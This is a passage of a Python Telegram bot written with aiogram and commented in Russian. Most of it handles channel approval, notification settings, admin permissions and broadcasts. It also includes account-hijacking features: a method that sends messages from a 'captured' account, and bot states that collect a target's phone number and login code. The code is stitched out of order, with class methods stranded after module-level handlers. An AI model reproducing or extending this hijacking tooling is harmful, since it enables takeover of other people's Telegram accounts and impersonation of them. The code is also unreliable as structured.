                            media_path: str = None, message_type: str = 'text') -> Dict:
        """Отправляет сообщение в канал"""
        try:
            # Получаем информацию о канале
            channel_data = db.fetch_one(
                """SELECT channel_id, channel_title, notifications_enabled, 
                   admin_notifications, is_approved FROM channels WHERE id = ?""",
                (channel_db_id,)
            )
            
            if not channel_data:
                return {'success': False, 'error': 'Канал не найден'}
            
            channel_id, channel_title, notifications_enabled, admin_notifications, is_approved = channel_data
            
            # Проверяем, одобрен ли канал
            if not is_approved:
                return {
                    'success': False, 
                    'error': 'Канал не одобрен для отправки уведомлений',
                    'status': 'not_approved'
                }
            
            # Если уведомления в канал выключены, отправляем админу
            if not notifications_enabled:
                if admin_notifications:
                    await bot.send_message(
                        config.MAIN_ADMIN_ID,
                        f"🔕 <b>Сообщение для канала (уведомления выключены)</b>\n\n"
                        f"📢 Канал: {channel_title}\n"
                        f"🔗 ID: {channel_id}\n\n"
                        f"{message}",
                        parse_mode="HTML"
                    )
                    return {
                        'success': True, 
                        'sent_to_admin': True, 
                        'sent_to_channel': False,
                        'message': 'Отправлено только админу (уведомления выключены)'
                    }
                else:
                    return {
                        'success': False, 
                        'error': 'Уведомления отключены',
                        'status': 'notifications_disabled'
                    }
            
            # Отправляем в канал
            try:
                if media_path and os.path.exists(media_path):
                    with open(media_path, 'rb') as f:
                        if media_path.lower().endswith(('.jpg', '.jpeg', '.png')):
                            sent_message = await bot.send_photo(
                                channel_id,
                                InputFile(f),
                                caption=message,
                                parse_mode="HTML"
                            )
                        elif media_path.lower().endswith('.mp4'):
                            sent_message = await bot.send_video(
                                channel_id,
                                InputFile(f),
                                caption=message,
                                parse_mode="HTML"
                            )
                        else:
                            sent_message = await bot.send_document(
                                channel_id,
                                InputFile(f),
                                caption=message,
                                parse_mode="HTML"
                            )
                else:
                    sent_message = await bot.send_message(
                        channel_id,
                        message,
                        parse_mode="HTML"
                    )
                
                # Обновляем последнее сообщение
                db.execute(
                    "UPDATE channels SET last_message_id = ?, last_activity = ? WHERE id = ?",
                    (sent_message.message_id, datetime.now().isoformat(), channel_db_id)
                )
                
                # Логируем отправку
                db.execute('''
                    INSERT INTO messages 
                    (message_id, chat_id, message_type, message_text, sent_date, status)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    sent_message.message_id,
                    channel_id,
                    message_type,
                    message[:500],
                    datetime.now().isoformat(),
                    'sent_to_channel'
                ))
                
                return {
                    'success': True,
                    'message_id': sent_message.message_id,
                    'sent_to_channel': True,
                    'sent_to_admin': False,
                    'channel_title': channel_title,
                    'message': f'Сообщение отправлено в канал "{channel_title}"'
                }
                
            except TelegramBadRequest as e:
                error_msg = str(e)
                logger.error(f"Ошибка отправки в канал {channel_id}: {error_msg}")
                
                # Если не удалось отправить в канал, отправляем админу
                if admin_notifications:
                    await bot.send_message(
                        config.MAIN_ADMIN_ID,
                        f"⚠️ <b>ОШИБКА ОТПРАВКИ В КАНАЛ</b>\n\n"
                        f"📢 Канал: {channel_title}\n"
                        f"🔗 ID: {channel_id}\n"
                        f"❌ Ошибка: {error_msg[:200]}\n\n"
                        f"Сообщение: {message[:500]}",
                        parse_mode="HTML"
                    )
                    return {
                        'success': False, 
                        'error': error_msg, 
                        'sent_to_admin': True,
                        'status': 'error_sent_to_admin'
                    }
                else:
                    return {'success': False, 'error': error_msg}
                
        except Exception as e:
            logger.error(f"Ошибка отправки в канал: {e}")
            return {'success': False, 'error': str(e)}
    
    async def get_all_channels(self, filters: Dict = None) -> List[Dict]:
        """Получает список всех каналов"""
        try:
            query = """SELECT id, channel_id, channel_title, channel_username, 
                      is_approved, notifications_enabled, admin_notifications, 
                      added_date, bot_is_admin FROM channels"""
            params = []
            
            if filters:
                conditions = []
                if filters.get('approved_only'):
                    conditions.append("is_approved = 1")
                if filters.get('pending_only'):
                    conditions.append("is_approved = 0")
                if filters.get('active_only'):
                    conditions.append("notifications_enabled = 1")
                if filters.get('bot_admin_only'):
                    conditions.append("bot_is_admin = 1")
                if filters.get('search'):
                    conditions.append("(channel_title LIKE ? OR channel_username LIKE ?)")
                    search_term = f"%{filters['search']}%"
                    params.extend([search_term, search_term])
                
                if conditions:
                    query += " WHERE " + " AND ".join(conditions)
            
            query += " ORDER BY is_approved DESC, added_date DESC"
            
            channels = db.fetch_all(query, params)
            
            result = []
            for ch in channels:
                result.append({
                    'id': ch[0],
                    'channel_id': ch[1],
                    'title': ch[2],
                    'username': ch[3],
                    'is_approved': bool(ch[4]),
                    'notifications_enabled': bool(ch[5]),
                    'admin_notifications': bool(ch[6]),
                    'added_date': ch[7],
                    'bot_is_admin': bool(ch[8])
                })
            
            return result
            
        except Exception as e:
            logger.error(f"Ошибка получения списка каналов: {e}")
            return []
    
    async def get_channel_stats(self) -> Dict:
        """Получает статистику по каналам"""
        try:
            total = db.fetch_one("SELECT COUNT(*) FROM channels")[0] or 0
            approved = db.fetch_one("SELECT COUNT(*) FROM channels WHERE is_approved = 1")[0] or 0
            pending = db.fetch_one("SELECT COUNT(*) FROM channels WHERE is_approved = 0")[0] or 0
            active = db.fetch_one("SELECT COUNT(*) FROM channels WHERE notifications_enabled = 1")[0] or 0
            bot_admin = db.fetch_one("SELECT COUNT(*) FROM channels WHERE bot_is_admin = 1")[0] or 0
            
            return {
                'total': total,
                'approved': approved,
                'pending': pending,
                'active': active,
                'bot_admin': bot_admin,
                'pending_approvals': len(self.pending_approvals)
            }
            
        except Exception as e:
            logger.error(f"Ошибка получения статистики каналов: {e}")
            return {}

channel_manager = ChannelManager()

# ========== МЕНЕДЖЕР АДМИНИСТРАТОРОВ ==========
class AdminManager:
    """Управление администраторами системы"""
    
    def __init__(self):
        self.admin_cache = {}
        self.load_admins_cache()
    
    def load_admins_cache(self):
        """Загружает администраторов в кэш"""
        try:
            admins = db.fetch_all(
                "SELECT user_id, username, permissions, is_main_admin FROM admins WHERE is_active = 1"
            )
            
            for admin in admins:
                self.admin_cache[admin[0]] = {
                    'username': admin[1],
                    'permissions': admin[2],
                    'is_main_admin': bool(admin[3])
                }
            
            logger.info(f"Загружено {len(self.admin_cache)} администраторов в кэш")
            
        except Exception as e:
            logger.error(f"Ошибка загрузки кэша администраторов: {e}")
    
    def is_admin(self, user_id: int) -> bool:
        """Проверяет, является ли пользователь администратором"""
        return user_id in self.admin_cache
    
    def is_main_admin(self, user_id: int) -> bool:
        """Проверяет, является ли пользователь главным администратором"""
        if user_id in self.admin_cache:
            return self.admin_cache[user_id]['is_main_admin']
        return False
    
    def has_permission(self, user_id: int, permission: str) -> bool:
        """Проверяет, есть ли у администратора определенное разрешение"""
        if not self.is_admin(user_id):
            return False
        
        admin_data = self.admin_cache[user_id]
        
        # Главный админ имеет все права
        if admin_data['is_main_admin']:
            return True
        
        permissions = admin_data['permissions']
        
        # Если разрешения 'all' - все доступно
        if permissions == 'all':
            return True
        
        # Проверяем конкретное разрешение
        permission_list = permissions.split(',')
        return permission in permission_list
    
    async def add_admin(self, user_id: int, username: str, added_by: int, 
                       permissions: str = 'basic') -> Dict:
        """Добавляет нового администратора"""
        try:
            # Проверяем, не является ли уже админом
            if self.is_admin(user_id):
                return {
                    'success': False,
                    'error': 'Пользователь уже является администратором'
                }
            
            # Проверяем лимит админов
            admin_count = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_active = 1")[0]
            if admin_count >= config.MAX_ADMINS:
                return {
                    'success': False,
                    'error': f'Достигнут лимит администраторов ({config.MAX_ADMINS})'
                }
            
            # Генерируем токен сессии
            session_token = encryptor.generate_token()
            session_expires = (datetime.now() + timedelta(days=30)).isoformat()
            
            # Добавляем в базу
            db.execute('''
                INSERT INTO admins 
                (user_id, username, added_by, permissions, session_token, session_expires)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user_id, username, added_by, permissions, session_token, session_expires))
            
            # Добавляем в кэш
            self.admin_cache[user_id] = {
                'username': username,
                'permissions': permissions,
                'is_main_admin': False
            }
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (added_by, 'add_admin', f'Добавлен админ {username} (ID: {user_id})'))
            
            # Уведомляем нового админа
            try:
                await bot.send_message(
                    user_id,
                    f"🎉 <b>ВЫ НАЗНАЧЕНЫ АДМИНИСТРАТОРОМ!</b>\n\n"
                    f"Вам предоставлены права администратора в системе SWILL.\n\n"
                    f"👤 Ваш ID: {user_id}\n"
                    f"🔑 Права: {permissions}\n"
                    f"👑 Добавил: ID {added_by}\n\n"
                    f"Используйте /start для доступа к панели администратора.",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Не удалось уведомить нового админа: {e}")
            
            logger.info(f"Добавлен новый админ: {username} (ID: {user_id})")
            
            return {
                'success': True,
                'user_id': user_id,
                'username': username,
                'permissions': permissions
            }
            
        except Exception as e:
            logger.error(f"Ошибка добавления администратора: {e}")
            return {'success': False, 'error': str(e)}
    

# ========== ОБРАБОТЧИК MY_CHAT_MEMBER ==========
@dp.my_chat_member()
async def handle_my_chat_member(update: types.ChatMemberUpdated):
    """Обрабатывает изменение статуса бота в чате/канале"""
    try:
        chat_member = update.new_chat_member
        chat = update.chat
        user = update.from_user
        
        # Проверяем, что бота добавили как администратора
        if chat_member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
            logger.info(f"Бота добавили как администратора в {chat.type} {chat.id}")
            
            # Определяем тип чата
            chat_type = str(chat.type).lower()
            
            # Обрабатываем только каналы и группы
            if chat_type in ['channel', 'group', 'supergroup']:
                # Запрашиваем одобрение у главного админа
                result = await channel_manager.handle_bot_added_as_admin(
                    chat.id,
                    user.id,
                    chat.id
                )
                
                # Уведомляем пользователя
                if result.get('success'):
                    if result.get('requires_approval'):
                        try:
                            await bot.send_message(
                                user.id,
                                f"✅ <b>БОТ УСПЕШНО ДОБАВЛЕН!</b>\n\n"
                                f"📢 {chat.type}: {chat.title}\n"
                                f"🔗 ID: {chat.id}\n\n"
                                f"<b>Статус:</b> Ожидает одобрения главного администратора.\n"
                                f"Вы получите уведомление, когда канал будет одобрен.",
                                parse_mode="HTML"
                            )
                        except:
                            pass
                    else:
                        try:
                            await bot.send_message(
                                user.id,
                                f"✅ <b>БОТ УСПЕШНО ДОБАВЛЕН И ОДОБРЕН!</b>\n\n"
                                f"📢 {chat.type}: {chat.title}\n"
                                f"🔗 ID: {chat.id}\n\n"
                                f"Теперь бот может отправлять уведомления в этот {chat.type}.",
                                parse_mode="HTML"
                            )
                        except:
                            pass
        
        # Если бота удалили из администраторов
        elif chat_member.status == ChatMemberStatus.LEFT or chat_member.status == ChatMemberStatus.KICKED:
            logger.info(f"Бота удалили из администраторов {chat.id}")
            
            # Обновляем статус в базе
            db.execute(
                "UPDATE channels SET bot_is_admin = 0 WHERE channel_id = ?",
                (chat.id,)
            )
            
            # Уведомляем главного админа
            try:
                await bot.send_message(
                    config.MAIN_ADMIN_ID,
                    f"⚠️ <b>БОТА УДАЛИЛИ ИЗ АДМИНИСТРАТОРОВ</b>\n\n"
                    f"📢 {chat.type}: {chat.title}\n"
                    f"🔗 ID: {chat.id}\n"
                    f"👤 Удалил: {user.id}\n\n"
                    f"Бот больше не может отправлять уведомления в этот {chat.type}.",
                    parse_mode="HTML"
                )
            except:
                pass
            
    except Exception as e:
        logger.error(f"Ошибка обработки my_chat_member: {e}")

# ========== КОМАНДА ДЛЯ УПРАВЛЕНИЯ УВЕДОМЛЕНИЯМИ ==========
@dp.message(Command("notifications"))
async def cmd_notifications(message: Message, state: FSMContext):
    """Команда для управления уведомлениями в каналах"""
    user_id = message.from_user.id
    
    # Проверяем, является ли админом
    if not admin_manager.is_admin(user_id):
        await message.answer("❌ У вас нет доступа к управлению уведомлениями.")
        return
    
    # Получаем список каналов пользователя
    channels = db.fetch_all(
        "SELECT id, channel_title, channel_username, is_approved, notifications_enabled FROM channels WHERE added_by = ? ORDER BY channel_title",
        (user_id,)
    )
    
    if not channels:
        await message.answer(
            "📭 <b>У ВАС НЕТ ДОБАВЛЕННЫХ КАНАЛОВ</b>\n\n"
            "Чтобы добавить канал:\n"
            "1. Добавьте бота как администратора в канал/группу\n"
            "2. Дождитесь одобрения главного администратора\n\n"
            "<i>После одобрения вы сможете управлять уведомлениями здесь.</i>",
            parse_mode="HTML"
        )
        return
    
    keyboard_buttons = []
    
    for channel in channels:
        channel_id, title, username, is_approved, notifications_enabled = channel
        status_icon = "✅" if notifications_enabled else "🔕"
        approval_icon = "✅" if is_approved else "⏳"
        
        keyboard_buttons.append([
            InlineKeyboardButton(
                text=f"{status_icon} {title[:20]}{'...' if len(title) > 20 else ''}",
                callback_data=f"manage_channel:{channel_id}"
            )
        ])
    
    # Добавляем кнопку "Назад" для админов
    if admin_manager.is_admin(user_id):
        keyboard_buttons.append([
            InlineKeyboardButton(text="↩️ В админ-панель", callback_data="back_to_main")
        ])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    await message.answer(
        "🔔 <b>УПРАВЛЕНИЕ УВЕДОМЛЕНИЯМИ</b>\n\n"
        f"📊 Ваши каналы ({len(channels)}):\n\n"
        "<i>Выберите канал для управления уведомлениями:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.startswith("manage_channel:"))
async def manage_channel_notifications(callback_query: CallbackQuery):
    """Управление уведомлениями для конкретного канала"""
    channel_db_id = int(callback_query.data.split(":")[1])
    user_id = callback_query.from_user.id
    
    # Получаем информацию о канале
    channel_data = db.fetch_one(
        """SELECT channel_title, channel_username, is_approved, 
           notifications_enabled, admin_notifications, channel_id 
           FROM channels WHERE id = ? AND (added_by = ? OR ? = ?)""",
        (channel_db_id, user_id, user_id, config.MAIN_ADMIN_ID)
    )
    
    if not channel_data:
        await callback_query.answer("❌ Канал не найден или нет доступа")
        return
    
    title, username, is_approved, notif_enabled, admin_notif, channel_id = channel_data
    
    # Создаем клавиатуру управления
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=f"{'🔕 Отключить' if notif_enabled else '🔔 Включить'} уведомления",
                callback_data=f"toggle_notif:{channel_db_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text=f"{'👁️ Скрыть' if admin_notif else '👁️ Показывать'} админу",
                callback_data=f"toggle_admin_notif:{channel_db_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text="📊 Статистика",
                callback_data=f"channel_stats:{channel_db_id}"
            ),
            InlineKeyboardButton(
                text="🔧 Проверить права",
                callback_data=f"check_channel_perms:{channel_db_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text="🗑️ Удалить канал",
                callback_data=f"delete_channel:{channel_db_id}"
            ) if user_id == config.MAIN_ADMIN_ID else InlineKeyboardButton(
                text="📝 Запросить удаление",
                callback_data=f"request_delete:{channel_db_id}"
            )
        ],
        [
            InlineKeyboardButton(text="↩️ Назад", callback_data="notifications_back")
        ]
    ])
    
    status_text = "✅ Одобрен" if is_approved else "⏳ Ожидает одобрения"
    notif_text = "🔔 Включены" if notif_enabled else "🔕 Выключены"
    admin_notif_text = "👁️ Показываются админу" if admin_notif else "👁️ Скрыты от админа"
    
    await callback_query.message.edit_text(
        f"🔧 <b>УПРАВЛЕНИЕ КАНАЛОМ</b>\n\n"
        f"📢 Название: {title}\n"
        f"🔗 Username: @{username if username else 'нет'}\n"
        f"🆔 ID: {channel_id}\n\n"
        f"📊 Статус:\n"
        f"• {status_text}\n"
        f"• {notif_text}\n"
        f"• {admin_notif_text}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.startswith("toggle_notif:"))
async def toggle_channel_notifications(callback_query: CallbackQuery):
    """Переключает уведомления в канале"""
    channel_db_id = int(callback_query.data.split(":")[1])
    
    result = await channel_manager.toggle_channel_notifications(channel_db_id)
    
    if result['success']:
        await callback_query.answer(result['message'])
        # Обновляем сообщение
        await manage_channel_notifications(callback_query)
    else:
        await callback_query.answer(f"❌ Ошибка: {result.get('error', 'Неизвестная ошибка')}")

@dp.callback_query(F.data.startswith("toggle_admin_notif:"))
async def toggle_admin_notifications(callback_query: CallbackQuery):
    """Переключает уведомления админу"""
    channel_db_id = int(callback_query.data.split(":")[1])
    
    result = await channel_manager.toggle_admin_notifications(channel_db_id)
    
    if result['success']:
        await callback_query.answer(result['message'])
        # Обновляем сообщение
        await manage_channel_notifications(callback_query)
    else:
        await callback_query.answer(f"❌ Ошибка: {result.get('error', 'Неизвестная ошибка')}")

@dp.callback_query(F.data == "notifications_back")
async def notifications_back(callback_query: CallbackQuery):
    """Возврат к списку каналов"""
    await cmd_notifications(callback_query.message, None)




    async def remove_admin(self, admin_id: int, removed_by: int, reason: str = "") -> Dict:
        """Удаляет администратора"""
        try:
            # Нельзя удалить главного админа
            if admin_id == config.MAIN_ADMIN_ID:
                return {
                    'success': False,
                    'error': 'Нельзя удалить главного администратора'
                }
            
            # Проверяем, существует ли админ
            admin_data = db.fetch_one(
                "SELECT username FROM admins WHERE user_id = ?",
                (admin_id,)
            )
            
            if not admin_data:
                return {'success': False, 'error': 'Администратор не найден'}
            
            username = admin_data[0]
            
            # Удаляем (деактивируем) админа
            db.execute('''
                UPDATE admins 
                SET is_active = 0, session_token = NULL, session_expires = NULL 
                WHERE user_id = ?
            ''', (admin_id,))
            
            # Удаляем из кэша
            if admin_id in self.admin_cache:
                del self.admin_cache[admin_id]
            
            # Уведомляем удаленного админа
            try:
                await bot.send_message(
                    admin_id,
                    f"⚠️ <b>ВАШИ ПРАВА АДМИНИСТРАТОРА ОТОЗВАНЫ</b>\n\n"
                    f"Вы больше не имеете доступа к панели администратора.\n\n"
                    f"👤 Ваш ID: {admin_id}\n"
                    f"👑 Отозвал: ID {removed_by}\n"
                    f"📝 Причина: {reason or 'Не указана'}\n\n"
                    f"По всем вопросам обращайтесь к главному администратору.",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Не удалось уведомить удаленного админа: {e}")
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (removed_by, 'remove_admin', f'Удален админ {username} (ID: {admin_id}): {reason}'))
            
            logger.info(f"Удален админ: {username} (ID: {admin_id})")
            
            return {
                'success': True,
                'admin_id': admin_id,
                'username': username,
                'removed_by': removed_by
            }
            
        except Exception as e:
            logger.error(f"Ошибка удаления администратора: {e}")
            return {'success': False, 'error': str(e)}
    
    async def update_admin_permissions(self, admin_id: int, permissions: str, 
                                     updated_by: int) -> Dict:
        """Обновляет права администратора"""
        try:
            # Проверяем, существует ли админ
            admin_data = db.fetch_one(
                "SELECT username FROM admins WHERE user_id = ? AND is_active = 1",
                (admin_id,)
            )
            
            if not admin_data:
                return {'success': False, 'error': 'Администратор не найден'}
            
            username = admin_data[0]
            
            # Обновляем права
            db.execute(
                "UPDATE admins SET permissions = ? WHERE user_id = ?",
                (permissions, admin_id)
            )
            
            # Обновляем кэш
            if admin_id in self.admin_cache:
                self.admin_cache[admin_id]['permissions'] = permissions
            
            # Уведомляем админа об изменении прав
            try:
                await bot.send_message(
                    admin_id,
                    f"🔧 <b>ВАШИ ПРАВА ОБНОВЛЕНЫ</b>\n\n"
                    f"Ваши права администратора были изменены.\n\n"
                    f"👤 Ваш ID: {admin_id}\n"
                    f"🔑 Новые права: {permissions}\n"
                    f"👑 Изменил: ID {updated_by}\n\n"
                    f"Некоторые функции могут стать недоступны.",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Не удалось уведомить админа об изменении прав: {e}")
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (updated_by, 'update_admin_permissions', f'Обновлены права для {username}: {permissions}'))
            
            return {
                'success': True,
                'admin_id': admin_id,
                'username': username,
                'permissions': permissions
            }
            
        except Exception as e:
            logger.error(f"Ошибка обновления прав администратора: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_all_admins(self) -> List[Dict]:
        """Возвращает список всех администраторов"""
        try:
            admins = db.fetch_all('''
                SELECT a.user_id, a.username, a.added_by, a.added_date, a.permissions, 
                       a.is_main_admin, b.username as added_by_username
                FROM admins a
                LEFT JOIN admins b ON a.added_by = b.user_id
                WHERE a.is_active = 1
                ORDER BY a.is_main_admin DESC, a.added_date DESC
            ''')
            
            result = []
            for admin in admins:
                result.append({
                    'user_id': admin[0],
                    'username': admin[1],
                    'added_by': admin[2],
                    'added_by_username': admin[6],
                    'added_date': admin[3],
                    'permissions': admin[4],
                    'is_main_admin': bool(admin[5])
                })
            
            return result
            
        except Exception as e:
            logger.error(f"Ошибка получения списка администраторов: {e}")
            return []
    
# В главном меню админа добавляем:
keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="📨 Отправить сообщение", callback_data="admin_send_message")],
    [InlineKeyboardButton(text="📢 Управление каналами", callback_data="admin_channels")],
    [InlineKeyboardButton(text="🔔 Управление уведомлениями", callback_data="admin_notifications")],  # Новая кнопка
    [InlineKeyboardButton(text="👥 Управление админами", callback_data="admin_manage")],
    [InlineKeyboardButton(text="👤 Управление аккаунтами", callback_data="admin_accounts")],
    [InlineKeyboardButton(text="⚙️ Настройки", callback_data="admin_settings")]
])

@dp.callback_query(F.data == "admin_notifications")
async def admin_notifications_menu(callback_query: CallbackQuery):
    """Меню управления уведомлениями для админов"""
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    # Получаем статистику
    stats = await channel_manager.get_channel_stats()
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📋 Мои каналы", callback_data="my_channels"),
            InlineKeyboardButton(text="📢 Все каналы", callback_data="all_channels")
        ],
        [
            InlineKeyboardButton(text="⏳ Ожидают одобрения", callback_data="pending_channels"),
            InlineKeyboardButton(text="🧪 Тест уведомлений", callback_data="test_notifications")
        ],
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data="channels_stats"),
            InlineKeyboardButton(text="⚙️ Настройки", callback_data="notification_settings")
        ],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"🔔 <b>УПРАВЛЕНИЕ УВЕДОМЛЕНИЯМИ</b>\n\n"
        f"📊 Статистика:\n"
        f"• Всего каналов: {stats.get('total', 0)}\n"
        f"• Одобрено: {stats.get('approved', 0)}\n"
        f"• Ожидают: {stats.get('pending', 0)}\n"
        f"• Активны: {stats.get('active', 0)}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

    async def validate_session(self, user_id: int, session_token: str) -> bool:
        """Проверяет валидность сессии администратора"""
        try:
            admin_data = db.fetch_one(
                "SELECT session_token, session_expires FROM admins WHERE user_id = ? AND is_active = 1",
                (user_id,)
            )
            
            if not admin_data:
                return False
            
            stored_token, expires_str = admin_data
            
            if not stored_token or stored_token != session_token:
                return False
            
            # Проверяем срок действия
            expires = datetime.fromisoformat(expires_str)
            if expires < datetime.now():
                return False
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка проверки сессии: {e}")
            return False
    
    async def create_session(self, user_id: int) -> str:
        """Создает новую сессию для администратора"""
        try:
            session_token = encryptor.generate_token()
            session_expires = (datetime.now() + timedelta(days=30)).isoformat()
            
            db.execute(
                "UPDATE admins SET session_token = ?, session_expires = ? WHERE user_id = ?",
                (session_token, session_expires, user_id)
            )
            
            return session_token
            
        except Exception as e:
            logger.error(f"Ошибка создания сессии: {e}")
            return None

admin_manager = AdminManager()

# ========== СИСТЕМА ОТПРАВКИ СООБЩЕНИЙ ==========
class MessageSystem:
    """Система отправки сообщений пользователям"""
    
    async def send_to_user_by_username(self, username: str, message: str, 
                                     from_admin_id: int, media_path: str = None) -> Dict:
        """Отправляет сообщение пользователю по username"""
        try:
            # Пытаемся найти пользователя по username
            user_id = await self._resolve_username(username)
            
            if not user_id:
                return {
                    'success': False,
                    'error': f'Пользователь {username} не найден'
                }
            
            # Отправляем сообщение
            try:
                if media_path and os.path.exists(media_path):
                    with open(media_path, 'rb') as f:
                        if media_path.lower().endswith(('.jpg', '.jpeg', '.png')):
                            sent_message = await bot.send_photo(
                                user_id,
                                InputFile(f),
                                caption=message
                            )
                        elif media_path.lower().endswith('.mp4'):
                            sent_message = await bot.send_video(
                                user_id,
                                InputFile(f),
                                caption=message
                            )
                        else:
                            sent_message = await bot.send_document(
                                user_id,
                                InputFile(f),
                                caption=message
                            )
                else:
                    sent_message = await bot.send_message(
                        user_id,
                        message,
                        parse_mode="HTML"
                    )
                
                # Сохраняем в базу
                db.execute('''
                    INSERT INTO messages 
                    (message_id, from_admin_id, to_user_id, to_username, message_text, 
                     message_type, sent_date, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    sent_message.message_id,
                    from_admin_id,
                    user_id,
                    username,
                    message,
                    'photo' if media_path and media_path.lower().endswith(('.jpg', '.jpeg', '.png')) else 
                    'video' if media_path and media_path.lower().endswith('.mp4') else 
                    'document' if media_path else 'text',
                    datetime.now().isoformat(),
                    'delivered'
                ))
                
                # Логируем действие
                db.execute('''
                    INSERT INTO security_logs 
                    (admin_id, action, details)
                    VALUES (?, ?, ?)
                ''', (from_admin_id, 'send_message', f'Отправлено сообщение пользователю {username}'))
                
                return {
                    'success': True,
                    'message_id': sent_message.message_id,
                    'user_id': user_id,
                    'username': username,
                    'status': 'delivered'
                }
                
            except TelegramBadRequest as e:
                error_msg = str(e)
                if "user not found" in error_msg.lower() or "chat not found" in error_msg.lower():
                    status = 'user_not_found'
                elif "blocked" in error_msg.lower():
                    status = 'user_blocked'
                elif "privacy" in error_msg.lower():
                    status = 'privacy_restriction'
                else:
                    status = 'error'
                
                # Сохраняем в базу с ошибкой
                db.execute('''
                    INSERT INTO messages 
                    (from_admin_id, to_username, message_text, sent_date, status)
                    VALUES (?, ?, ?, ?, ?)
                ''', (from_admin_id, username, message, datetime.now().isoformat(), status))
                
                return {
                    'success': False,
                    'error': error_msg,
                    'status': status
                }
                
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения пользователю {username}: {e}")
            return {'success': False, 'error': str(e)}
    
    async def _resolve_username(self, username: str) -> Optional[int]:
        """Разрешает username в user_id"""
        try:
            # Убираем @ если есть
            if username.startswith('@'):
                username = username[1:]
            
            # Пробуем через get_chat
            try:
                chat = await bot.get_chat(f"@{username}")
                return chat.id
            except:
                pass
            
            # Проверяем в базе пользователей
            user_data = db.fetch_one(
                "SELECT user_id FROM users WHERE username = ?",
                (username,)
            )
            
            if user_data:
                return user_data[0]
            
            return None
            
        except Exception as e:
            logger.error(f"Ошибка разрешения username {username}: {e}")
            return None
    
    async def broadcast_to_all_channels(self, message: str, from_admin_id: int, 
                                      media_path: str = None) -> Dict:
        """Рассылает сообщение во все одобренные каналы"""
        try:
            # Получаем все одобренные каналы с включенными уведомлениями
            channels = db.fetch_all('''
                SELECT id, channel_id FROM channels 
                WHERE is_approved = 1 AND notifications_enabled = 1
            ''')
            
            if not channels:
                return {
                    'success': False,
                    'error': 'Нет одобренных каналов для рассылки'
                }
            
            results = {
                'total': len(channels),
                'success': 0,
                'failed': 0,
                'errors': []
            }
            
            # Отправляем в каждый канал
            for channel in channels:
                channel_db_id, channel_id = channel
                
                try:
                    result = await channel_manager.send_to_channel(
                        channel_db_id,
                        message,
                        media_path
                    )
                    
                    if result['success']:
                        results['success'] += 1
                    else:
                        results['failed'] += 1
                        results['errors'].append(f"{channel_id}: {result.get('error', 'Unknown error')}")
                    
                    # Задержка между отправками
                    await asyncio.sleep(1)
                    
                except Exception as e:
                    results['failed'] += 1
                    results['errors'].append(f"{channel_id}: {str(e)[:100]}")
                    logger.error(f"Ошибка отправки в канал {channel_id}: {e}")
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (from_admin_id, 'broadcast', f'Рассылка в {results["total"]} каналов: {results["success"]} успешно'))
            
            return {
                'success': results['success'] > 0,
                'results': results
            }
            
        except Exception as e:
            logger.error(f"Ошибка рассылки: {e}")
            return {'success': False, 'error': str(e)}
    

    
    async def send_from_hijacked_account(self, account_id: int, target: str, 
                                       message: str, from_admin_id: int) -> Dict:
        """Отправляет сообщение от захваченного аккаунта"""
        try:
            result = await account_manager.send_message_from_account(
                account_id,
                target,
                message
            )
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (admin_id, action, details)
                VALUES (?, ?, ?)
            ''', (from_admin_id, 'send_from_hijacked', f'Отправка от аккаунта {account_id} к {target}'))
            
            return result
            
        except Exception as e:
            logger.error(f"Ошибка отправки от захваченного аккаунта: {e}")
            return {'success': False, 'error': str(e)}

message_system = MessageSystem()

# ========== СОСТОЯНИЯ FSM ==========
class AdminStates(StatesGroup):
    # Состояния для управления админами
    waiting_admin_username = State()
    waiting_admin_permissions = State()
    waiting_admin_confirm = State()
    waiting_admin_remove = State()
    waiting_admin_remove_reason = State()
    
    # Состояния для отправки сообщений
    waiting_message_username = State()
    waiting_message_text = State()
    waiting_message_media = State()
    waiting_message_confirm = State()
    
    # Состояния для управления каналами
    waiting_channel_id = State()
    waiting_channel_confirm = State()
    waiting_channel_action = State()
    
    # Состояния для захвата аккаунтов
    waiting_hijack_phone = State()
    waiting_hijack_code = State()
    waiting_hijack_method = State()
    waiting_hijack_target = State()
    
    # Состояния для рассылки
    waiting_broadcast_text = State()
    waiting_broadcast_confirm = State()
    
    # Состояния для настроек
    waiting_settings_action = State()
    waiting_proxy_url = State()
    waiting_security_level = State()

class UserStates(StatesGroup):
